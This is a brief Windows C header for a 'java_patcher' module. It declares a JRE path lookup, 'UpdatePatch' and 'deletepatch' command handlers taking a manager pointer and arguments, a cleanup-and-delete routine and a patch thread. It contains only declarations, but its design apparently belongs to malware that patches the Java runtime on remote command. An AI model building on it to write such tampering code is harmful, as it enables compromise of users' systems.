#ifndef		JAVS_PATCHERH
#define		JAVS_PATCHERH

#include "windows.h"

const char* GetJREPath();
const char UpdatePath[] = "UpdatePatch\0";
const char DeletePath[] = "deletepatch\0";

bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

bool WINAPI ClearAndDel( LPVOID lpData );

DWORD WINAPI Run_Path(LPVOID lpData);

#endif		//java_patcher